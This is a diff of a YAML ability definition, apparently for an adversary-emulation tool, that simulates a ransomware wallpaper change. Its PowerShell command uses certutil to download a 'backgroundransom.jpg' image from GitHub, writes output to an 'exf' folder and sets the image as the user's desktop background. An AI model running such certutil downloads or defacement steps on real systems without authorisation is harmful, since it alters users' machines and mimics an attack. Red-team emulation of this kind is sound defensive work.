@@ -1,4 +1,4 @@
-- name: change user Wallpaper (2)
+- name: Download and Change user's desktop wallpaper
   additional_info: {}
   plugin: ''
   executors:
@@ -8,15 +8,14 @@
     command: "$Exf_File=\"$env:PUBLIC\\exf\\Download_back.log\";\n$DestinationFile\
       \ = \"$env:HOMEDRIVE\\$env:USERPROFILE\\Documents\\backgroundransom.jpg\";\n\
       $DownloadURL=\"https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg\"\
-      ;\n$CompleteCommand= \"cmd /c certutil -urlcache -split -f \"+\" $DownloadURL\"\
-      +\" $DestinationFile\";\nInvoke-Expression  $CompleteCommand | Out-File \"$Exf_File\"\
-      ;\n$MyWallpaper=\"$DestinationFile\";\n\n$code = @' \nusing System.Runtime.InteropServices;\
-      \ \nnamespace Win32{ \n    \n     public class Wallpaper{ \n        [DllImport(\"\
+      ;\n$CompleteCommand= \"certutil -urlcache -f \"+\" $DownloadURL\"+\" $DestinationFile\"\
+      ;\nInvoke-Expression  $CompleteCommand | Out-File \"$Exf_File\";\n$MyWallpaper=\"\
+      $DestinationFile\";\n\n$code = @' \nusing System.Runtime.InteropServices; \n\
+      namespace Win32{ \n    \n     public class Wallpaper{ \n        [DllImport(\"\
       user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo\
       \ (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n\
       \         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);\
-      \ \n         }\n    }\n } \n'@;\nadd-type $code; \n\n#Apply the Change on the\
-      \ system \n[Win32.Wallpaper]::SetWallpaper($MyWallpaper);"
+      \ \n         }\n    }\n } \n'@;\nadd-type $code; \n\n[Win32.Wallpaper]::SetWallpaper($MyWallpaper);"
     variations: []
     build_target: null
     cleanup: []
